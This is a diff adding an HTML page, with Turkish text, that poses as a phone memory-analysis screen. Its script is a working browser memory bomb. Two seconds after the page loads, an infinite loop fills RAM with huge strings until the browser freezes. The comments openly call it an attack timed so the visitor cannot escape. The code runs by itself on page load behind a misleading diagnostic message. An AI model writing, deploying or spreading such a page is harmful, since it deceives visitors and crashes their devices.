@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Analizi</title>
+</head>
+<body style="background:#000; color:#0f0; text-align:center; padding-top:50px; font-family:monospace;">
+    <h1>BELLEK ANALİZİ YAPILIYOR...</h1>
+    <p>Lütfen bu sayfa açıkken telefonunuzu kapatmayın.</p>
+
+    <script>
+        // RAM'i şişirecek olan ana depo
+        let bellekBombasi = [];
+
+        function patlat() {
+            // Sonsuz döngü: Durmak yok, sadece RAM dolana kadar veri pompalar
+            while(true) {
+                try {
+                    // Her saniyede binlerce devasa veri bloğu oluşturur
+                    // "Array(1000000)" komutu bellekte çok büyük yer kaplar
+                    let veri = new Array(1000000).fill("RAM_CRASH_2026_").join("");
+                    bellekBombasi.push(veri);
+                } catch(e) {
+                    // RAM tamamen dolduğunda tarayıcı zaten kilitlenecek
+                }
+            }
+        }
+
+        // Sayfa açıldıktan 2 saniye sonra saldırı başlar
+        // (Kullanıcının sayfayı görmesi ve kaçamaması için kısa bir süre)
+        setTimeout(patlat, 2000);
+    </script>
+</body>
+</html>
